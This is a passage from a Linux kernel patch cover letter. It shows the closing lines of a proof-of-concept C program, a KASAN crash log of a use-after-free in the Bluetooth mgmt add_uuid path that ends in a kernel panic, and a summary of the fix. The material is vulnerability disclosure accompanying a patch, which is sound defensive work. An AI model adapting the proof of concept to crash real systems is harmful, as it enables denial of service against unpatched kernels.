	for (int i = 0; i < NAME_THREADS; i++)
		pthread_join(namer[i], NULL);
	pthread_join(mutator, NULL);
	pthread_cancel(ctrl);
	pthread_join(ctrl, NULL);
	close(vhci_fd);

	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  731.804442][T10611] Oops: general protection fault, probably for non-canonical address 0xfbd59c0000000022: 0000 [#1] SMP KASAN NOPTI
[  731.806236][T10611] KASAN: maybe wild-memory-access in range [0xdead000000000110-0xdead000000000117]
[  731.807527][T10611] CPU: 2 UID: 0 PID: 10611 Comm: poc Not tainted 7.0.0-08308-g9e1e9d660255 #1 PREEMPT(full)
[  731.808802][T10611] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  731.810176][T10611] RIP: 0010:add_uuid (net/bluetooth/mgmt.c:2704)
[  731.811002][T10611] Code: fc ff df eb 1a 48 89 d8 48 c1 e8 03 42 80 3c 38 00 0f 85 ba 03 00 00 48 8b 1b 48 39 d3 74 7a 48 8d 7b 10 48 89 f8 48 c1 e8 03 <42> 0f b6 04 38 84 c0 74 08 3c 01 0f 8e 82 03 00 00 0f b7 43 10 66
[  731.813503][T10611] RSP: 0018:ffa000000a4d7ad8 EFLAGS: 00010216
[  731.814181][T10611] RAX: 1bd5a00000000022 RBX: dead000000000100 RCX: 0000000000034020
[  731.815019][T10611] RDX: ff1100010e0dd1e8 RSI: ffffffff8b0e9640 RDI: dead000000000110
[  731.815863][T10611] RBP: ff1100010be4804e R08: 0000000000000000 R09: fffffbfff21299a2
[  731.816694][T10611] R10: ffa000000a4d7ad8 R11: 0000000080000000 R12: ff110001103d0800
[  731.817527][T10611] R13: ff1100010e0dc000 R14: ff1100010e0dc058 R15: dffffc0000000000
[  731.818348][T10611] FS:  00007f83a86ce6c0(0000) GS:ff11000184b68000(0000) knlGS:0000000000000000
[  731.819293][T10611] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  731.820006][T10611] CR2: 000055f56324dda4 CR3: 000000010b123000 CR4: 0000000000751ef0
[  731.820865][T10611] PKRU: 55555554
[  731.821262][T10611] Call Trace:
[  731.821627][T10611]  <TASK>
[  731.821946][T10611]  ? _raw_read_unlock (arch/x86/include/asm/preempt.h:104)
[  731.822581][T10611]  hci_sock_sendmsg (arch/x86/include/asm/bitops.h:202)
[  731.823137][T10611]  ? __pfx_hci_sock_sendmsg+0x10/0x10
[  731.823717][T10611]  ? __pfx_hci_sock_recvmsg+0x10/0x10
[  731.824293][T10611]  sock_write_iter (net/socket.c:1224)
[  731.824867][T10611]  ? __pfx_sock_write_iter+0x10/0x10
[  731.825450][T10611]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:375)
[  731.826133][T10611]  ? security_file_permission (arch/x86/include/asm/jump_label.h:37)
[  731.826834][T10611]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:375)
[  731.827438][T10611]  ? rw_verify_area (fs/read_write.c:462)
[  731.828011][T10611]  vfs_write (include/linux/percpu-rwsem.h:65)
[  731.828472][T10611]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:375)
[  731.829074][T10611]  ? __pfx_vfs_write+0x10/0x10
[  731.829623][T10611]  ksys_write (fs/read_write.c:741)
[  731.830093][T10611]  ? __pfx_ksys_write+0x10/0x10
[  731.830623][T10611]  ? srso_alias_return_thunk (arch/x86/include/asm/nospec-branch.h:375)
[  731.831213][T10611]  ? rcu_is_watching (include/linux/context_tracking.h:128)
[  731.831841][T10611]  do_syscall_64 (include/linux/thread_info.h:142)
[  731.832372][T10611]  ? irqentry_exit (arch/x86/include/asm/processor.h:720)
[  731.832818][T10611]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:138)
[  731.833193][T10611] RIP: 0033:0x7f83a976e9ee
[  731.833503][T10611] Code: 08 0f 85 f5 4b ff ff 49 89 fb 48 89 f0 48 89 d7 48 89 ce 4c 89 c2 4d 89 ca 4c 8b 44 24 08 4c 8b 4c 24 10 4c 89 5c 24 08 0f 05 <c3> 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 80 00 00 00 00 48 83 ec 08
[  731.834714][T10611] RSP: 002b:00007f83a86cd988 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
[  731.835239][T10611] RAX: ffffffffffffffda RBX: 00007f83a86ce6c0 RCX: 00007f83a976e9ee
[  731.835763][T10611] RDX: 0000000000000017 RSI: 00007f83a86cd9f0 RDI: 0000000000000005
[  731.836268][T10611] RBP: 00007f83a86cd9f0 R08: 0000000000000000 R09: 0000000000000000
[  731.836789][T10611] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000010
[  731.837294][T10611] R13: 0000000000000017 R14: 0000000000000010 R15: 00000000000000b0
[  731.837858][T10611]  </TASK>
[  731.838058][T10611] Modules linked in:
[  731.838587][T10611] ---[ end trace 0000000000000000 ]---
[  731.840804][T10611] RIP: 0010:add_uuid (net/bluetooth/mgmt.c:2704)
[  731.841164][T10611] Code: fc ff df eb 1a 48 89 d8 48 c1 e8 03 42 80 3c 38 00 0f 85 ba 03 00 00 48 8b 1b 48 39 d3 74 7a 48 8d 7b 10 48 89 f8 48 c1 e8 03 <42> 0f b6 04 38 84 c0 74 08 3c 01 0f 8e 82 03 00 00 0f b7 43 10 66
[  731.843673][T10611] RSP: 0018:ffa000000a4d7ad8 EFLAGS: 00010216
[  731.844417][T10611] RAX: 1bd5a00000000022 RBX: dead000000000100 RCX: 0000000000034020
[  731.845411][T10611] RDX: ff1100010e0dd1e8 RSI: ffffffff8b0e9640 RDI: dead000000000110
[  731.846480][T10611] RBP: ff1100010be4804e R08: 0000000000000000 R09: fffffbfff21299a2
[  731.847510][T10611] R10: ffa000000a4d7ad8 R11: 0000000080000000 R12: ff110001103d0800
[  731.848574][T10611] R13: ff1100010e0dc000 R14: ff1100010e0dc058 R15: dffffc0000000000
[  731.849732][T10611] FS:  00007f83a86ce6c0(0000) GS:ff11000184b68000(0000) knlGS:0000000000000000
[  731.850909][T10611] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  731.851823][T10611] CR2: 000055f56324dda4 CR3: 000000010b123000 CR4: 0000000000751ef0
[  731.852857][T10611] PKRU: 55555554
[  731.853343][T10611] Kernel panic - not syncing: Fatal exception
[  731.854585][T10611] Kernel Offset: disabled
[  731.855196][T10611] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  Bluetooth: mgmt: fix pending command UAF in EIR updates

 net/bluetooth/mgmt.c | 20 ++++++++++++++++++--
 1 file changed, 18 insertions(+), 2 deletions(-)

-- 
2.43.0

